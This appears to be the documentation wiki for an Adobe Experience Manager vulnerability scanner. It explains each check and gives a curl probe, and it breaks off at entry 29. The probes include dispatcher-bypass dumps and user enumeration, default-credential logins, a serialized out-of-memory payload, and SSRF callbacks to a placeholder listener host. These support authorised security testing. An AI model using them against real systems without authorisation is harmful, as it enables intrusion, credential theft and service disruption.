# AEM Hacker – CVE & Vulnerability Coverage Wiki

This document describes every check implemented in `aem_hacker.py`.  For each
check you will find:

* **Handler name** – the value you pass to `--handler`
* **Finding name** – the label printed in tool output
* **Vulnerability class** – e.g. SSRF, XSS, XXE, RCE …
* **CVE** – assigned identifier(s) where applicable
* **CVSS score & rating** – exact NVD base score where an official CVE exists
  (v3.1 where available, v2.0 otherwise); scores prefixed with `~` in the
  quick-reference table are internal severity estimates for misconfigurations
  that have no assigned CVE and are **not** official NVD scores
* **Affected AEM versions** – known affected range
* **Why the vulnerability exists** – short technical explanation
* **How to test manually with `curl`** – a copy-paste command you can run
  against a live target (replace `https://TARGET` with the real URL)

> **Note:** SSRF checks require an externally reachable host that can receive
> HTTP callbacks.  Replace `YOURHOST` / `YOURPORT` in the curl examples with
> your VPS address.  SSRF findings are printed only after the tool waits ≈10 s
> for an inbound callback; the curl commands below show just the trigger
> request.

---

## Quick-Reference Table

| # | Handler | CVE | CVSS | Rating | Vuln Class |
|---|---------|-----|------|--------|------------|
| 1 | `set_preferences` | — | ~4.3 | Medium | Reflected XSS |
| 2 | `merge_metadata` | — | ~4.3 | Medium | Reflected XSS |
| 3 | `get_servlet` | — | ~7.5 | High | Info Disclosure |
| 4 | `querybuilder_servlet` | — | ~7.5 | High | Info Disclosure |
| 5 | `gql_servlet` | — | ~7.5 | High | Info Disclosure |
| 6 | `guide_internal_submit_servlet` | CVE-2019-8086 | 9.8 | Critical | XXE |
| 7 | `post_servlet` | — | ~8.8 | High | Persistent XSS / RCE |
| 8 | `create_new_nodes` | — | ~8.8 | High | Persistent XSS / RCE |
| 9 | `create_new_nodes2` | — | ~8.8 | High | Persistent XSS / RCE |
| 10 | `loginstatus_servlet` | — | ~9.8 | Critical | Auth Bypass / Credential Brute-force |
| 11 | `userinfo_servlet` | — | ~7.5 | High | Info Disclosure / Credential Brute-force |
| 12 | `felix_console` | — | ~9.8 | Critical | RCE |
| 13 | `wcmdebug_filter` | CVE-2016-7882 | 6.1 | Medium | Reflected XSS |
| 14 | `wcmsuggestions_servlet` | — | ~6.1 | Medium | Reflected XSS |
| 15 | `crxde_crx` | — | ~7.5 | High | Info Disclosure / RCE |
| 16 | `salesforcesecret_servlet` | CVE-2018-5006 | 7.5 | High | SSRF |
| 17 | `reportingservices_servlet` | CVE-2018-12809 | 7.5 | High | SSRF |
| 18 | `sitecatalyst_servlet` | — | ~7.5 | High | SSRF → RCE |
| 19 | `autoprovisioning_servlet` | — | ~7.5 | High | SSRF → RCE |
| 20 | `opensocial_proxy` | — | ~7.5 | High | SSRF |
| 21 | `opensocial_makeRequest` | — | ~7.5 | High | SSRF |
| 22 | `swf_xss` | — | ~6.1 | Medium | Reflected XSS (Flash) |
| 23 | `externaljob_servlet` | — | ~9.8 | Critical | Java Deserialization |
| 24 | `webdav` | CVE-2015-1833 | 9.1 | Critical | XXE / Path Traversal |
| 25 | `groovy_console` | — | ~9.8 | Critical | RCE |
| 26 | `acs_tools` | — | ~9.8 | Critical | RCE |
| 27 | `version_disclosure` | — | ~5.3 | Medium | Info Disclosure (Hardening) |
| 28 | `open_redirect` | CVE-2023-29297 | 6.1 | Medium | Open Redirect |
| 29 | `auth_bypass_cve_2023_38205` | CVE-2023-38205 | 9.8 | Critical | Auth Bypass → RCE |
| 30 | `xss_aem_forms` | CVE-2021-36063 | 6.1 | Medium | Reflected XSS |
| 31 | `xss_reflected_cve_2022` | CVE-2022-30677 / CVE-2022-30679 | 6.1 | Medium | Reflected XSS |
| 32 | `ssrf_cve_2021_40722` | CVE-2021-40722 | 7.5 | High | SSRF |

---

## Detailed Entries

---

### 1 · `set_preferences` — Exposed setPreferences.jsp (Reflected XSS)

| Field | Value |
|-------|-------|
| Finding name | `SetPreferences` |
| Vulnerability class | Reflected XSS |
| CVE | — (misconfiguration) |
| CVSS | ~4.3 (Medium) |
| Affected versions | AEM 5.x – 6.x (CRXDE enabled) |

**Why it exists**
`/crx/de/setPreferences.jsp` is a CRXDE Lite helper page that echoes the
`keymap` query parameter back into the response without HTML-encoding it.  When
CRXDE Lite is left accessible on a production instance, an attacker can craft a
URL that runs arbitrary JavaScript in the victim's browser.

**Manual curl test**

```bash
curl -sk 'https://TARGET/crx/de/setPreferences.jsp?keymap=<script>alert(1)</script>&language=0' \
  | grep -o '<script>alert(1)</script>'
```

A vulnerable instance returns the unencoded string in the HTTP 400 response body.

---

### 2 · `merge_metadata` — Exposed MergeMetadataServlet (Reflected XSS)

| Field | Value |
|-------|-------|
| Finding name | `MergeMetadataServlet` |
| Vulnerability class | Reflected XSS |
| CVE | — (misconfiguration) |
| CVSS | ~4.3 (Medium) |
| Affected versions | AEM 6.x with DAM enabled |

**Why it exists**
`/libs/dam/merge/metadata` is a DAM servlet that accepts an asset `path`
parameter and returns merged metadata as JSON.  On unpatched or misconfigured
instances the response can include unsanitized user-controlled input, enabling
injection into pages that render that JSON without escaping.

**Manual curl test**

```bash
curl -sk 'https://TARGET/libs/dam/merge/metadata.html?path=/etc&.ico' \
  | python3 -m json.tool | grep -i assetPaths
```

A non-empty `assetPaths` array in the JSON response confirms exposure.

---

### 3 · `get_servlet` — Exposed DefaultGetServlet (Information Disclosure)

| Field | Value |
|-------|-------|
| Finding name | `DefaultGetServlet` |
| Vulnerability class | Sensitive Information Disclosure |
| CVE | — (misconfiguration) |
| CVSS | ~7.5 (High) |
| Affected versions | All AEM versions |

**Why it exists**
Apache Sling's `DefaultGetServlet` serialises JCR nodes to JSON when a `.json`
extension is appended to any resource URL.  Dispatcher rules or authentication
requirements are frequently absent or bypassed with URL-encoding tricks
(`/etc.json`, `/home.1.json`, `....4.2.1....json`).  Exposed nodes can contain
service credentials, encryption keys, user passwords, API tokens, and other
secrets stored in the JCR.

**Manual curl test**

```bash
# Basic dump of /etc node
curl -sk 'https://TARGET/etc.json' | python3 -m json.tool

# Bypass dispatcher with selector trick
curl -sk 'https://TARGET/etc....4.2.1....json' | python3 -m json.tool

# Check /home/users for user nodes
curl -sk 'https://TARGET/home/users.1.json' | python3 -m json.tool
```

A valid JSON response containing `jcr:primaryType` confirms the node is readable.

---

### 4 · `querybuilder_servlet` — Exposed QueryBuilder (Information Disclosure)

| Field | Value |
|-------|-------|
| Finding name | `QueryBuilderJsonServlet` / `QueryBuilderFeedServlet` |
| Vulnerability class | Sensitive Information Disclosure |
| CVE | — (misconfiguration) |
| CVSS | ~7.5 (High) |
| Affected versions | AEM 5.x – 6.x |

**Why it exists**
AEM's QueryBuilder API (`/bin/querybuilder.json`) and Feed servlet
(`/bin/querybuilder.feed`) allow full-text JCR queries over HTTP without
authentication when the Dispatcher is not properly configured.  An attacker can
enumerate all users, extract password hashes, OAuth tokens, and other sensitive
JCR properties.

**Manual curl test**

```bash
# Enumerate user accounts
curl -sk 'https://TARGET/bin/querybuilder.json?type=rep:User&p.limit=-1' \
  | python3 -m json.tool

# Dispatcher bypass variant
curl -sk 'https://TARGET/bin/querybuilder.json.css' \
  -d 'type=rep:User&p.limit=-1' | python3 -m json.tool
```

A response with a `hits` array confirms exposure.

---

### 5 · `gql_servlet` — Exposed GQL Servlet (Information Disclosure)

| Field | Value |
|-------|-------|
| Finding name | `GQLServlet` |
| Vulnerability class | Sensitive Information Disclosure |
| CVE | — (misconfiguration) |
| CVSS | ~7.5 (High) |
| Affected versions | AEM 5.x – 6.x |

**Why it exists**
The GQL (Graph Query Language) servlet at `/bin/wcm/search/gql.json` executes
Jackrabbit GQL queries without requiring authentication on misconfigured
instances.  Like QueryBuilder, this exposes the full JCR content tree to
unauthenticated users.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/bin/wcm/search/gql.json?query=type:User%20limit:..1&pathPrefix=&p.ico' \
  | python3 -m json.tool
```

A `hits` array with user node data confirms exposure.

---

### 6 · `guide_internal_submit_servlet` — XXE via GuideInternalSubmitServlet (CVE-2019-8086)

| Field | Value |
|-------|-------|
| Finding name | `GuideInternalSubmitServlet` |
| Vulnerability class | XML External Entity (XXE) |
| CVE | **CVE-2019-8086** |
| CVSS v3.1 | **9.8 (Critical)** |
| Affected versions | AEM 6.3, 6.4.0 – 6.4.4, 6.5.0 (Forms add-on) |
| Adobe bulletin | [APSB19-48](https://helpx.adobe.com/security/products/experience-manager/apsb19-48.html) |

**Why it exists**
Adobe AEM Forms ships `GuideInternalSubmitServlet`, which processes an Adaptive
Form submission payload containing XML (`guidePrefillXml`).  The XML parser was
configured without disabling external entity resolution, so an attacker can
embed a `SYSTEM` entity in the XML to read local files (`/etc/passwd`,
`repository.xml`, credential files) or trigger SSRF to internal services.  The
servlet was reachable without authentication on affected versions.

**Manual curl test**

```bash
# Confirm servlet exposure (benign – no XXE payload)
curl -sk -X POST \
  'https://TARGET/libs/fd/af/components/guideContainer/cq:template.af.internalsubmit.json' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: https://TARGET' \
  --data-urlencode 'guideState={"guideState":{"guideDom":{},"guideContext":{"xsdRef":"","guidePrefillXml":"<afData>TESTTOKEN</afData>"}}}'

# TESTTOKEN appearing in the response confirms the servlet is accessible
```

---

### 7 · `post_servlet` — Exposed SlingPostServlet (Persistent XSS / RCE)

| Field | Value |
|-------|-------|
| Finding name | `POSTServlet` |
| Vulnerability class | Persistent XSS / Remote Code Execution |
| CVE | — (misconfiguration) |
| CVSS | ~8.8 (High) |
| Affected versions | All AEM versions |

**Why it exists**
Apache Sling's `SlingPostServlet` allows creating, modifying, and deleting JCR
nodes via HTTP POST.  If accessible without authentication, an attacker can
write arbitrary content nodes (e.g. storing `<script>` tags in properties
rendered by AEM templates) or – with sufficient privileges – overwrite `/apps`
to achieve server-side code execution.

**Manual curl test**

```bash
# Confirm exposure with the no-operation request
curl -sk -X POST 'https://TARGET/.json' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: https://TARGET' \
  -d ':operation=nop'

# "Null Operation Status: OK" in the response confirms the servlet is reachable
```

---

### 8 · `create_new_nodes` — Unauthenticated JCR Node Creation

| Field | Value |
|-------|-------|
| Finding name | `CreateJCRNodes` |
| Vulnerability class | Persistent XSS / RCE |
| CVE | — (misconfiguration) |
| CVSS | ~8.8 (High) |
| Affected versions | AEM 5.x – 6.x |

**Why it exists**
When anonymous write access is granted to paths under `/content/usergenerated`
(or when default credentials such as `admin:admin` / `author:author` are
active), an unauthenticated attacker can POST new JCR nodes.  These nodes can
hold HTML/script content that gets served by Sling servlets registered by
resource type, resulting in persistent XSS or RCE depending on the target path.

**Manual curl test**

```bash
# Anonymous write attempt
curl -sk -X POST 'https://TARGET/content/usergenerated/testnode' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: https://TARGET' \
  -d 'a=b'

# "Parent Location" in the HTML response and HTTP 200/201 indicates success
```

---

### 9 · `create_new_nodes2` — JCR Node Creation via Geometrixx Sample Users

| Field | Value |
|-------|-------|
| Finding name | `CreateJCRNodes 2` |
| Vulnerability class | Persistent XSS / RCE |
| CVE | — (sample content misconfiguration) |
| CVSS | ~8.8 (High) |
| Affected versions | AEM 5.x – 6.x with Geometrixx sample content installed |

**Why it exists**
Adobe's Geometrixx sample content ships default user accounts
(`aparker@geometrixx.info:aparker`, `jdoe@geometrixx.info:jdoe`, etc.) with
write permissions to their own home directories under `/home/users/geometrixx`.
If the sample content is left installed in a production environment, attackers
can authenticate with these well-known credentials and create JCR nodes.

**Manual curl test**

```bash
# aparker@geometrixx.info:aparker encoded as Base64
curl -sk -X POST \
  'https://TARGET/home/users/geometrixx/aparker@geometrixx.info/testnode' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: https://TARGET' \
  -H 'Authorization: Basic YXBhcmtlckBnZW9tZXRyaXh4LmluZm86YXBhcmtlcg==' \
  -d 'a=b'
```

---

### 10 · `loginstatus_servlet` — Exposed LoginStatusServlet (Credential Brute-force)

| Field | Value |
|-------|-------|
| Finding name | `LoginStatusServlet` / `AEM with default credentials` |
| Vulnerability class | Authentication Weakness / Credential Enumeration |
| CVE | — (misconfiguration) |
| CVSS | ~9.8 (Critical) |
| Affected versions | All AEM versions |

**Why it exists**
`/system/sling/loginstatus` returns a JSON response indicating whether the
supplied HTTP Basic credentials are valid (`authenticated=true`).  When exposed
without rate-limiting, this becomes an oracle for credential brute-forcing.
Combined with usernames harvested from JCR node attributes
(`jcr:createdBy`, `jcr:lastModifiedBy`), an attacker can confirm whether
default or common passwords are in use.

**Manual curl test**

```bash
# Check if servlet is accessible anonymously
curl -sk 'https://TARGET/system/sling/loginstatus.json'

# Test admin:admin credential pair
curl -sk 'https://TARGET/system/sling/loginstatus.json' \
  -H 'Authorization: Basic YWRtaW46YWRtaW4='

# "authenticated=true" in the body means the password is correct
```

---

### 11 · `userinfo_servlet` — Exposed UserInfoServlet (Information Disclosure)

| Field | Value |
|-------|-------|
| Finding name | `UserInfoServlet` / `AEM with default credentials` |
| Vulnerability class | Information Disclosure / Authentication Weakness |
| CVE | — (misconfiguration) |
| CVSS | ~7.5 (High) |
| Affected versions | AEM 5.x – 6.x |

**Why it exists**
`/libs/cq/security/userinfo.json` returns the currently authenticated user's
ID.  When accessible, it can be used to verify credential pairs and discover
valid accounts.  Combined with default passwords it confirms full account
compromise.

**Manual curl test**

```bash
curl -sk 'https://TARGET/libs/cq/security/userinfo.json' \
  -H 'Authorization: Basic YWRtaW46YWRtaW4='

# A non-anonymous "userID" field in the response confirms access
```

---

### 12 · `felix_console` — Exposed Felix OSGi Console (RCE)

| Field | Value |
|-------|-------|
| Finding name | `FelixConsole` |
| Vulnerability class | Remote Code Execution |
| CVE | — (default credentials + misconfiguration) |
| CVSS | ~9.8 (Critical) |
| Affected versions | All AEM versions |

**Why it exists**
The Apache Felix OSGi Web Console at `/system/console/bundles` allows
uploading and installing OSGi bundles.  AEM ships with this console enabled and
protected by HTTP Basic auth.  When the `admin:admin` credential is unchanged
(the default), or when the console is accessible without authentication, an
attacker can install a malicious bundle that executes arbitrary Java code inside
the AEM JVM.

**Manual curl test**

```bash
# Confirm exposure
curl -sk 'https://TARGET/system/console/bundles' \
  -H 'Authorization: Basic YWRtaW46YWRtaW4=' | grep -o 'Web Console - Bundles'
```

Reference: <https://github.com/0ang3el/aem-rce-bundle>

---

### 13 · `wcmdebug_filter` — WCMDebugFilter Reflected XSS (CVE-2016-7882)

| Field | Value |
|-------|-------|
| Finding name | `WCMDebugFilter` |
| Vulnerability class | Reflected Cross-Site Scripting (XSS) |
| CVE | **CVE-2016-7882** |
| CVSS v3.1 | 6.1 (Medium) |
| Affected versions | AEM 6.0 – 6.2 (patched in 6.2 SP1) |
| Adobe bulletin | [APSB16-38](https://helpx.adobe.com/security/products/experience-manager/apsb16-38.html) |

**Why it exists**
`WCMDebugFilter` is a Sling servlet filter that activates when the query
parameter `debug=layout` is present.  On vulnerable versions, the filter
reflected request metadata (`sel=`, `res=`, etc.) into the HTML response without
output encoding.  An attacker can craft a URL that causes script execution in
the victim's browser.

**Manual curl test**

```bash
curl -sk 'https://TARGET/.json?debug=layout' | grep -E 'sel=|res='

# A response containing those fields in rendered HTML confirms the filter is
# active – add a script tag to the request to achieve XSS
```

Reference: <https://medium.com/@jonathanbouman/reflected-xss-at-philips-com-e48bf8f9cd3c>

---

### 14 · `wcmsuggestions_servlet` — WCMSuggestionsServlet Reflected XSS

| Field | Value |
|-------|-------|
| Finding name | `WCMSuggestionsServlet` |
| Vulnerability class | Reflected Cross-Site Scripting (XSS) |
| CVE | — (misconfiguration) |
| CVSS | ~6.1 (Medium) |
| Affected versions | AEM 5.x – 6.x |

**Why it exists**
`/bin/wcm/contentfinder/connector/suggestions` is a content-finder autocomplete
endpoint.  The `pre` and `post` query parameters are echoed into the JSON
response without HTML encoding, so any page that renders that JSON inline
becomes vulnerable to XSS.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/bin/wcm/contentfinder/connector/suggestions.json?query_term=path%3a/&pre=<1337abcdef>&post=yyyy' \
  | grep '1337abcdef'

# Presence of <1337abcdef> in the response confirms XSS
```

---

### 15 · `crxde_crx` — Exposed CRXDE Lite / CRX Explorer / Package Manager

| Field | Value |
|-------|-------|
| Finding name | `CRXDE Lite/CRX` |
| Vulnerability class | Information Disclosure / RCE |
| CVE | — (misconfiguration) |
| CVSS | ~7.5 (High) |
| Affected versions | All AEM versions |

**Why it exists**
CRXDE Lite (`/crx/de`), CRX Explorer (`/crx/explorer`), and Package Manager
(`/crx/packmgr`) are development and administration tools that are bundled with
AEM but should be disabled on production systems.  When exposed, they provide
read/write access to the entire JCR repository and allow deploying ZIP packages
that can override `/apps` scripts to achieve RCE.

**Manual curl test**

```bash
# CRXDE Lite
curl -sk 'https://TARGET/crx/de/index.jsp' | grep -o 'CRXDE Lite'

# CRX Explorer
curl -sk 'https://TARGET/crx/explorer/browser/index.jsp' | grep -o 'Content Explorer'

# Package Manager
curl -sk 'https://TARGET/crx/packmgr/index.jsp' | grep -o 'CRX Package Manager'
```

---

### 16 · `salesforcesecret_servlet` — SSRF via SalesforceSecretServlet (CVE-2018-5006)

| Field | Value |
|-------|-------|
| Finding name | `SalesforceSecretServlet` |
| Vulnerability class | Server-Side Request Forgery (SSRF) |
| CVE | **CVE-2018-5006** |
| CVSS v3.0 | **7.5 (High)** |
| Affected versions | AEM 6.2, 6.3.0 – 6.3.2, 6.4.0 |
| Adobe bulletin | [APSB18-23](https://helpx.adobe.com/security/products/experience-manager/apsb18-23.html) |

**Why it exists**
`/libs/mcm/salesforce/customer.json` accepts an `authorization_url` or
`instance_url` parameter that is used directly in a server-side HTTP request to
fetch OAuth tokens.  The parameter value is not validated against an allow-list,
so an attacker can force AEM to connect to an arbitrary host, exfiltrate
instance-level secrets, or use the SSRF to pivot to internal services.

**Manual curl test**

```bash
# Replace YOURHOST:YOURPORT with a netcat/HTTP listener you control
curl -sk \
  'https://TARGET/libs/mcm/salesforce/customer.json?checkType=authorize&authorization_url=http://YOURHOST:YOURPORT/ssrf-hit&customer_key=z&customer_secret=z&redirect_uri=x&code=e'

# An inbound connection to your listener confirms SSRF
```

---

### 17 · `reportingservices_servlet` — SSRF via ReportingServicesServlet (CVE-2018-12809)

| Field | Value |
|-------|-------|
| Finding name | `ReportingServicesServlet` |
| Vulnerability class | Server-Side Request Forgery (SSRF) |
| CVE | **CVE-2018-12809** |
| CVSS v3.0 | **7.5 (High)** |
| Affected versions | AEM 6.2, 6.3 – 6.3.2, 6.4 – 6.4.1 |
| Adobe bulletin | [APSB18-23](https://helpx.adobe.com/security/products/experience-manager/apsb18-23.html) |

**Why it exists**
`/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet` proxies
requests to Adobe SiteCatalyst/Analytics using a `url` query parameter.  No
allow-list is enforced, so an attacker can direct the request to any host
reachable from the AEM server.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet?url=http://YOURHOST:YOURPORT/ssrf-hit%23&q=a'
```

---

### 18 · `sitecatalyst_servlet` — SSRF via SiteCatalystServlet (SSRF → RCE)

| Field | Value |
|-------|-------|
| Finding name | `SiteCatalystServlet` |
| Vulnerability class | Server-Side Request Forgery → Remote Code Execution |
| CVE | — (researcher-found) |
| CVSS | ~7.5 (High) |
| Affected versions | AEM ≤ 6.2-SP1-CFP7 on Jetty (default install) |

**Why it exists**
`/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet` accepts a
`datacenter` parameter used verbatim to build a server-side HTTP request.  On
older AEM versions running on the embedded Jetty server, `aem_ssrf2rce.py` can
chain this SSRF with AEM's replication API to write a JSP shell to the
repository and achieve full RCE.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet?datacenter=http://YOURHOST:YOURPORT/ssrf-hit%23&company=xxx&username=zzz&secret=yyyy'
```

Reference: <https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=87>

---

### 19 · `autoprovisioning_servlet` — SSRF via AutoProvisioningServlet (SSRF → RCE)

| Field | Value |
|-------|-------|
| Finding name | `AutoprovisioningServlet` |
| Vulnerability class | Server-Side Request Forgery → Remote Code Execution |
| CVE | — (researcher-found) |
| CVSS | ~7.5 (High) |
| Affected versions | AEM ≤ 6.2-SP1-CFP7 on Jetty (default install) |

**Why it exists**
`/libs/cq/cloudservicesprovisioning/content/autoprovisioning` issues a
server-side HTTP request to an endpoint controlled by a request parameter.  The
same SSRF-to-RCE chain exploitable via `SiteCatalystServlet` applies here.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/libs/cq/cloudservicesprovisioning/content/autoprovisioning.json?authorizableId=x&path=http://YOURHOST:YOURPORT/ssrf-hit%23'
```

---

### 20 · `opensocial_proxy` — SSRF via OpenSocial (Shindig) Proxy

| Field | Value |
|-------|-------|
| Finding name | `Opensocial (shindig) proxy` |
| Vulnerability class | Server-Side Request Forgery (SSRF) |
| CVE | — |
| CVSS | ~7.5 (High) |
| Affected versions | AEM versions bundling Apache Shindig |

**Why it exists**
Apache Shindig (the OpenSocial container bundled with AEM) exposes a proxy
endpoint at `/libs/opensocial/proxy` that fetches arbitrary external URLs on
behalf of gadgets.  When reachable without authentication, this becomes an SSRF
vector that can be used to scan internal networks, exfiltrate secrets, or
perform XSS via reflected JavaScript responses.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/libs/opensocial/proxy.json?container=default&url=http://YOURHOST:YOURPORT/ssrf-hit'
```

Reference: <https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem?slide=41>

---

### 21 · `opensocial_makeRequest` — SSRF via OpenSocial makeRequest

| Field | Value |
|-------|-------|
| Finding name | `Opensocial (shindig) makeRequest` |
| Vulnerability class | Server-Side Request Forgery (SSRF) |
| CVE | — |
| CVSS | ~7.5 (High) |
| Affected versions | AEM versions bundling Apache Shindig |

**Why it exists**
`/libs/opensocial/makeRequest` is a second Shindig SSRF endpoint that supports
additional parameters (`httpMethod`, `postData`, `headers`, `contentType`),
providing greater flexibility to an attacker.  It can be used to reach
authenticated internal services by forwarding custom request headers.

**Manual curl test**

```bash
curl -sk -X POST \
  'https://TARGET/libs/opensocial/makeRequest?url=http://YOURHOST:YOURPORT/ssrf-hit' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'httpMethod=GET'
```

---

### 22 · `swf_xss` — Reflected XSS via Bundled SWF Files

| Field | Value |
|-------|-------|
| Finding name | `Reflected XSS via SWF` |
| Vulnerability class | Reflected Cross-Site Scripting (XSS, Flash) |
| CVE | — (legacy Flash issues) |
| CVSS | ~6.1 (Medium) |
| Affected versions | AEM instances serving Flash (.swf) clientlibs |

**Why it exists**
AEM ships several Adobe Flash (SWF) media-player and uploader components in its
clientlibs.  Flash SWF files are historically vulnerable to XSS when they
accept parameters like `onclick`, `contentPath`, `javascriptCallbackFunction`,
or `movieName` and pass them to `ExternalInterface.call()` without validation.

**Manual curl test**

```bash
# Verify the SWF is served without a Content-Disposition header
curl -skI 'https://TARGET/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf' \
  | grep -iE 'content-type|content-disposition'

# Content-Type: application/x-shockwave-flash WITHOUT Content-Disposition
# confirms the file is exploitable in browsers that still run Flash
```

Reference: <https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem?slide=61>

---

### 23 · `externaljob_servlet` — Java Deserialization via ExternalJobServlet

| Field | Value |
|-------|-------|
| Finding name | `ExternalJobServlet` |
| Vulnerability class | Unsafe Java Deserialization |
| CVE | — (researcher-found, 2018/2019) |
| CVSS | ~9.8 (Critical) |
| Affected versions | AEM 5.x – 6.x with DAM Cloud Proxy enabled |

**Why it exists**
`/libs/dam/cloud/proxy` (the DAM Cloud Proxy servlet) accepts multipart
form-data uploads that include a serialised Java object in the `file` field.
The servlet deserialises this object without validating the class.  An attacker
can submit a crafted gadget-chain payload to cause an Out-Of-Memory error (as
the tool's probe does) or, with a suitable gadget chain (e.g. Apache Commons
Collections), achieve arbitrary RCE.

**Manual curl test**

```bash
# OOM probe – does NOT execute code; just tests for the vulnerability class.
# Write the payload to a temp file first (binary-safe; avoids Bash here-string
# NUL-byte stripping).
# Note: on macOS use `base64 -D` (uppercase D) instead of `base64 -d`
echo 'rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////c=' \
  | base64 -d > /tmp/jobevent.bin
curl -sk -X POST 'https://TARGET/libs/dam/cloud/proxy.json' \
  -H 'Referer: https://TARGET' \
  -F ':operation=job' \
  -F 'file=@/tmp/jobevent.bin;filename=jobevent;type=application/octet-stream'

# HTTP 500 with "Java heap space" in the body confirms the endpoint deserialises
```

Reference: <https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps?slide=102>

---

### 24 · `webdav` — Exposed WebDAV / CVE-2015-1833

| Field | Value |
|-------|-------|
| Finding name | `WebDAV exposed` |
| Vulnerability class | XXE / Path Traversal via WebDAV |
| CVE | **CVE-2015-1833** |
| CVSS v2.0 | 9.1 (Critical) |
| Affected versions | Apache Jackrabbit ≤ 2.10.0 (bundled in AEM ≤ 6.1) |
| Apache advisory | https://jackrabbit.apache.org/security-reports.html |

**Why it exists**
Apache Jackrabbit's WebDAV implementation parsed XML request bodies (used by
`PROPFIND`, `PROPPATCH`, `REPORT` etc.) without disabling external entity
resolution.  An attacker who can send a WebDAV request to `/crx/repository/`
can read arbitrary local files or trigger SSRF via a `SYSTEM` entity in the XML
body.  Additionally, exposed WebDAV allows writing and reading files directly
in the JCR, enabling stored XSS.

**Manual curl test**

```bash
# Check if WebDAV challenge is presented
curl -sk -I 'https://TARGET/crx/repository/test' | grep -i 'www-authenticate'

# A 401 with WWW-Authenticate containing "webdav" indicates the endpoint is exposed
```

---

### 25 · `groovy_console` — Exposed Groovy Console (RCE)

| Field | Value |
|-------|-------|
| Finding name | `GroovyConsole` |
| Vulnerability class | Remote Code Execution |
| CVE | — (misconfiguration) |
| CVSS | ~9.8 (Critical) |
| Affected versions | AEM instances with the ACS AEM Commons Groovy Console bundle installed |

**Why it exists**
The [ACS AEM Commons](https://adobe-consulting-services.github.io/acs-aem-commons/)
Groovy Console bundle exposes an HTTP endpoint at `/bin/groovyconsole/post.json`.
When accessible without authentication, any Groovy script submitted to it is
executed inside the AEM JVM with full `javax.jcr.Session` access and OS-level
`Runtime.exec()` capability.

**Manual curl test**

```bash
# Check if the Groovy Console UI is reachable
curl -sk 'https://TARGET/groovyconsole.html' | grep -oi 'Groovy Console'
```

---

### 26 · `acs_tools` — Exposed ACS AEM Tools Fiddle (RCE)

| Field | Value |
|-------|-------|
| Finding name | `ACSTools` |
| Vulnerability class | Remote Code Execution |
| CVE | — (misconfiguration) |
| CVSS | ~9.8 (Critical) |
| Affected versions | AEM instances with the ACS AEM Tools bundle installed |

**Why it exists**
[ACS AEM Tools](https://adobe-consulting-services.github.io/acs-aem-tools/)
includes an `AEM Fiddle` feature at `/apps/acs-tools/ui/fiddle/submit.json` that
executes arbitrary server-side scripts (JSP, Groovy, etc.) submitted via HTTP
POST.  This tool is intended only for development and should never be installed
on production instances.

**Manual curl test**

```bash
curl -sk -X POST 'https://TARGET/apps/acs-tools/ui/fiddle/submit.json' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'type=jsp&code=%3C%25%3D+%22abcdef31337%22+%25%3E'

# HTTP 200 containing "abcdef31337" confirms the Fiddle is exposed
```

---

### 27 · `version_disclosure` — AEM Version Disclosure (Information Disclosure)

| Field | Value |
|-------|-------|
| Finding name | `AEM Version Disclosure` / `AEM Version Disclosure (ProductInfo)` |
| Vulnerability class | Information Disclosure (Hardening) |
| CVE | — (hardening recommendation) |
| CVSS | ~5.3 (Medium) |
| Affected versions | All AEM versions |

**Why it exists**
The AEM login page (`/libs/granite/core/content/login.html`) and the Felix
product-info console (`/system/console/productinfo`) both disclose the exact AEM
build number in their HTML.  Knowing the precise version lets an attacker quickly
identify which CVEs apply, significantly reducing reconnaissance time.

**Manual curl test**

```bash
# Check login page for version string
curl -sk 'https://TARGET/libs/granite/core/content/login.html' \
  | grep -iE 'AEM [0-9]|data-granite-version|Build [0-9]'

# Check Felix productinfo (requires admin:admin or equivalent)
curl -sk 'https://TARGET/system/console/productinfo' \
  -H 'Authorization: Basic YWRtaW46YWRtaW4=' \
  | grep -iE 'Adobe Experience Manager|CQ Version|Quickstart'
```

---

### 28 · `open_redirect` — Open Redirect via Login Page Resource Parameter (CVE-2023-29297)

| Field | Value |
|-------|-------|
| Finding name | `OpenRedirect` |
| Vulnerability class | Open Redirect |
| CVE | **CVE-2023-29297** |
| CVSS v3.1 | **6.1 (Medium)** |
| Affected versions | AEM 6.5.16.0 and earlier |
| Adobe bulletin | [APSB23-31](https://helpx.adobe.com/security/products/experience-manager/apsb23-31.html) |

**Why it exists**
The AEM login page accepts a `resource` query parameter to redirect users after
authentication.  On affected versions, the parameter value is not validated
against an allow-list of internal paths, allowing an attacker to redirect an
authenticated user to an arbitrary external URL.  This can be exploited for
phishing or credential harvesting.

**Manual curl test**

```bash
curl -skI \
  'https://TARGET/libs/granite/core/content/login.html?resource=https://evil.example.com' \
  | grep -i location

# A Location: https://evil.example.com response confirms the open redirect
```

---

### 29 · `auth_bypass_cve_2023_38205` — Auth Bypass via Double-Slash Dispatcher (CVE-2023-38205)

| Field | Value |
|-------|-------|
| Finding name | `AuthBypassFelixConsole` / `AuthBypassCRX` |
| Vulnerability class | Authentication Bypass → Remote Code Execution |
| CVE | **CVE-2023-38205** |
| CVSS v3.1 | **9.8 (Critical)** |
| Affected versions | AEM 6.5.17.0 and earlier |
